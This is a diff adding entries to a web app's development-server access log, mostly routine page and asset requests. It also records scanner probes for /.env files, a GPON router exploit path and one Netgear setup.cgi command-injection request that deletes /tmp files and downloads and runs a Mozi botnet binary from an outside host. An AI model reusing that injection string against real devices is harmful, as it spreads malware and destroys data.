@@ -1842,3 +1842,1757 @@ Press CTRL+C to quit
 167.248.133.44 - - [07/Dec/2022 03:07:46] "GET /favicon.ico HTTP/1.1" 404 -
 185.254.196.115 - - [07/Dec/2022 03:10:13] "GET /.env HTTP/1.1" 404 -
 185.254.196.115 - - [07/Dec/2022 03:10:13] "POST / HTTP/1.1" 405 -
+118.235.15.153 - - [07/Dec/2022 03:19:29] "GET /static/css/reset.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:29] "GET /static/css/style.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/css/map.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/js/index.js HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/assets/search.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/assets/like.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:30] "GET /static/assets/call.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 03:19:31] "GET /Good_Say HTTP/1.1" 200 -
+128.14.141.34 - - [07/Dec/2022 03:34:09] "GET /admin/ HTTP/1.1" 404 -
+198.199.94.158 - - [07/Dec/2022 03:50:55] "GET / HTTP/1.1" 200 -
+185.254.196.115 - - [07/Dec/2022 04:15:55] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [07/Dec/2022 04:15:56] "POST / HTTP/1.1" 405 -
+135.125.246.189 - - [07/Dec/2022 04:30:53] "POST / HTTP/1.1" 405 -
+135.125.246.189 - - [07/Dec/2022 04:30:53] "GET /.env HTTP/1.1" 404 -
+172.104.11.46 - - [07/Dec/2022 05:01:30] code 400, message Bad request version ('À\x14À')
+172.104.11.46 - - [07/Dec/2022 05:01:30] "   ¬êuÕ¼IºÏ2òÉH$ éæU?TÕµbÒ ´   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET / HTTP/1.1" 200 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/css/style.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/css/reset.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/css/map.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/js/index.js HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/assets/search.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/assets/like.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:49] "GET /static/assets/call.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:50] "GET /Good_Say HTTP/1.1" 200 -
+118.235.15.153 - - [07/Dec/2022 05:40:52] "GET /map HTTP/1.1" 200 -
+118.235.15.153 - - [07/Dec/2022 05:40:52] "GET /static/css/reset.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:52] "GET /static/css/map.css HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:52] "GET /static/assets/like.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:52] "GET /static/assets/search.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:52] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+118.235.15.153 - - [07/Dec/2022 05:40:52] "GET /favicon.ico HTTP/1.1" 404 -
+54.215.227.193 - - [07/Dec/2022 05:41:49] "GET /explore HTTP/1.1" 404 -
+34.77.127.183 - - [07/Dec/2022 06:19:14] "GET / HTTP/1.1" 200 -
+205.210.31.143 - - [07/Dec/2022 06:55:46] "GET / HTTP/1.1" 200 -
+185.254.196.115 - - [07/Dec/2022 07:04:37] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [07/Dec/2022 07:04:38] "POST / HTTP/1.1" 405 -
+128.14.209.146 - - [07/Dec/2022 07:05:46] "GET / HTTP/1.1" 200 -
+135.125.246.110 - - [07/Dec/2022 07:08:05] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [07/Dec/2022 07:08:06] "GET /.env HTTP/1.1" 404 -
+20.104.111.105 - - [07/Dec/2022 07:34:42] "GET http://www.google.com/ HTTP/1.0" 200 -
+135.125.246.110 - - [07/Dec/2022 08:18:49] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [07/Dec/2022 08:18:50] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [07/Dec/2022 08:31:31] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [07/Dec/2022 08:31:32] "POST / HTTP/1.1" 405 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/css/map.css HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/js/index.js HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 08:31:58] "GET /static/assets/call.png HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 08:32:00] "GET /Good_Say HTTP/1.1" 200 -
+64.62.197.19 - - [07/Dec/2022 08:43:26] "GET / HTTP/1.1" 200 -
+64.62.197.25 - - [07/Dec/2022 08:45:51] "GET /favicon.ico HTTP/1.1" 404 -
+183.96.80.196 - - [07/Dec/2022 08:54:36] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/css/map.css HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:37] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [07/Dec/2022 08:54:38] "GET /Good_Say HTTP/1.1" 200 -
+45.33.80.243 - - [07/Dec/2022 08:56:32] code 400, message Bad request version ('À\x14À')
+45.33.80.243 - - [07/Dec/2022 08:56:32] "   Õ¬¸¾áe5ã|ãËôk¼dkÔØE¨K¢Ü±HÁ   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:03] code 400, message Bad request version ('\x03\x03{të;ú\x92\x15{\x10*(\x8acÊ')
+164.52.54.35 - - [07/Dec/2022 08:59:03] "  {të;ú{*(cÊ" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:08] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03b\x8aï.m^ë\x04B.T\x9b\x89òl')
+164.52.54.35 - - [07/Dec/2022 08:59:08] " ½  ¹bï.m^ëB.Tòl=´e" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:12] code 400, message Bad request version ('}ä\x95%7ØV\x18É¤8\x00\x00\x12À')
+164.52.54.35 - - [07/Dec/2022 08:59:12] " c  _<g~ý÷hÔÌëÐJU«Z}}ä%7ØVÉ¤8  À" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:13] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\x88}\x89þ%>¡\x9a\x89Ñ/')
+164.52.54.35 - - [07/Dec/2022 08:59:13] " c  _}þ%>¡Ñ/¹vüC$E¹ósásW7Û,è  À" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:13] "GET / HTTP/1.1" 200 -
+164.52.54.35 - - [07/Dec/2022 08:59:13] code 400, message Bad request version ('î\x01ðb¦ÏÅ<"7H\x8c6\x9d¼Ë\x12ÐubÄ1è\x8b')
+164.52.54.35 - - [07/Dec/2022 08:59:13] "  %´+âSP9Ý1æÍÕwbWÓÿwJÛôÉì	ÿtÁk îðb¦ÏÅ<"7H6¼ËÐubÄ1è" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:17] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03s¡öÇCÛ§\x14\x07Æ¹')
+164.52.54.35 - - [07/Dec/2022 08:59:17] " ½  ¹s¡öÇCÛ§Æ¹j)NVþvý£°¥áSOôà¦  8À,À0 Ì©Ì¨ÌªÀ+À/ À$À( kÀ#À' gÀ" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:20] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00c\x01\x00\x00_\x03\x02«XKàí%õÿ\x05Ê-\x8dk\x11îó')
+164.52.54.35 - - [07/Dec/2022 08:59:20] " c  _«XKàí%õÿÊ-kîó	[ï<îâèn%nÊH  À" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:20] code 400, message Bad request version ('3KÔÂW6\x00\x00\x12À')
+164.52.54.35 - - [07/Dec/2022 08:59:20] " c  _Å·xbZS/ÇûÂL-GüVl"3KÔÂW6  À" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:26] "GET / HTTP/1.1" 200 -
+164.52.54.35 - - [07/Dec/2022 08:59:29] code 400, message Bad request version ("2,\x94\x9fþ>øBç\x86\x96¿*Kxñ¼¿¿òáä\x82¨®\x07F)k¿å\x15\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+164.52.54.35 - - [07/Dec/2022 08:59:29] "  'Ü$ãjëC¶H^¦Ï×ñ×-Ç\z" 1ð>¯ 2,þ>øBç¿*Kxñ¼¿¿òáä¨®F)k¿å >À,À0 Ì©Ì¨ÌªÀ+À/ À$À( kÀ#À' gÀ" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:35] code 400, message Bad request syntax ("\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03Ibk\x87Ð¸\x90Þ)ý\x0e,FVOS©óû\x8a¨m9\x9fo\x9eBh\x86I\x89\x12\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+164.52.54.35 - - [07/Dec/2022 08:59:35] " ½  ¹IbkÐ¸Þ)ý,FVOS©óû¨m9oBhI  8À,À0 Ì©Ì¨ÌªÀ+À/ À$À( kÀ#À' gÀ" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:38] code 400, message Bad request version ('³\x00\x00\x12À')
+164.52.54.35 - - [07/Dec/2022 08:59:38] " c  _i$©¥Õ2®úâçUé©Y&5,, ³0ÞóKÅ¬³  À" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:43] code 400, message Bad request syntax ('\x16\x03\x01\x00c\x01\x00\x00_\x03\x01;¶ýÞ´\x87oc¡TP')
+164.52.54.35 - - [07/Dec/2022 08:59:43] " c  _;¶ýÞ´oc¡TP" HTTPStatus.BAD_REQUEST -
+164.52.54.35 - - [07/Dec/2022 08:59:47] "GET /static/assets/house.svg HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:47] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:47] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:47] "GET /static/css/style.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:47] "GET /static/css/map.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/js/index.js HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/call.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/house.svg HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:27:48] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:58] "GET /Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:59] "GET /static/css/profile.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:27:59] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:27:59] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:27:59] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:27:59] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:27:59] "GET /Login?loc%20=%20Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:28:00] "GET /static/css/Login.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:28:00] "GET /favicon.ico HTTP/1.1" 404 -
+211.187.196.252 - - [07/Dec/2022 09:28:06] "GET /rank HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:28:06] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:06] "GET /static/css/ranking.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:28:06] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:06] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:06] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:06] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:21] "GET /Write/2 HTTP/1.1" 404 -
+211.187.196.252 - - [07/Dec/2022 09:28:23] "GET /Write/2 HTTP/1.1" 404 -
+211.187.196.252 - - [07/Dec/2022 09:28:29] "GET /map HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:28:29] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:29] "GET /static/css/map.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:29] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:29] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:28:29] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:29:16] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:29:16] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:29:16] "GET /static/css/map.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:29:52] "GET /rank HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:29:52] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:29:52] "GET /static/css/ranking.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:29:52] "GET /static/css/style.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:29:52] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:29:52] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:29:52] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /write/2 HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /static/css/style.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /static/css/write2style.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:02] "GET /Login?loc%20=%20write/2 HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:03] "GET /static/css/Login.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:07] "GET /register HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:07] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:07] "GET /static/css/joinstyle.css HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:30:22] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:04] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:31:04] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:04] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:04] "GET /static/css/map.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:05] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /write/2 HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /static/css/write2style.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:14] "GET /Login?loc%20=%20write/2 HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:31:15] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:17] "GET /rank HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:31:17] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:17] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:17] "GET /static/css/ranking.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:17] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:17] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:17] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:21] "GET /Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:31:21] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:21] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:21] "GET /static/css/profile.css HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:21] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:21] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [07/Dec/2022 09:31:21] "GET /Login?loc%20=%20Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [07/Dec/2022 09:31:22] "GET /static/css/Login.css HTTP/1.1" 304 -
+103.40.199.94 - - [07/Dec/2022 09:36:29] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+198.235.24.136 - - [07/Dec/2022 10:18:08] "GET / HTTP/1.1" 200 -
+220.64.100.252 - - [07/Dec/2022 10:23:50] "GET /Login HTTP/1.1" 200 -
+112.152.36.226 - - [07/Dec/2022 10:26:29] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [07/Dec/2022 10:26:29] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:29] "GET /static/css/map.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:29] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:29] "GET /static/js/index.js HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:30] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:30] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:30] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:30] "GET /static/assets/like.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:30] "GET /static/assets/search.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:30] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:33] "GET /Good_Say HTTP/1.1" 200 -
+112.152.36.226 - - [07/Dec/2022 10:26:36] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:36] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:26:36] "GET /static/css/map.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:09] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/css/map.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/js/index.js HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/assets/search.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/assets/like.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:10] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:12] "GET /static/assets/house.svg HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:12] "GET /static/assets/house.svg HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:13] "GET /Good_Say HTTP/1.1" 200 -
+112.152.36.226 - - [07/Dec/2022 10:28:26] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [07/Dec/2022 10:28:26] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:26] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:26] "GET /static/css/map.css HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:27] "GET /static/js/index.js HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:27] "GET /static/assets/search.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:27] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:27] "GET /static/assets/like.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:27] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:27] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:27] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [07/Dec/2022 10:28:31] "GET /Good_Say HTTP/1.1" 200 -
+135.125.246.110 - - [07/Dec/2022 10:35:51] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [07/Dec/2022 10:35:52] "GET /.env HTTP/1.1" 404 -
+101.0.32.50 - - [07/Dec/2022 11:14:34] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://101.0.32.50:60535/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
+121.53.80.4 - - [07/Dec/2022 11:29:36] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 11:29:36] "GET / HTTP/1.1" 200 -
+61.82.217.159 - - [07/Dec/2022 11:29:36] "GET /static/css/reset.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:36] "GET /static/css/style.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:36] "GET /static/css/map.css HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:37] "GET /static/js/index.js HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:37] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:37] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 11:29:37] "GET /static/assets/like.png HTTP/1.1" 304 -
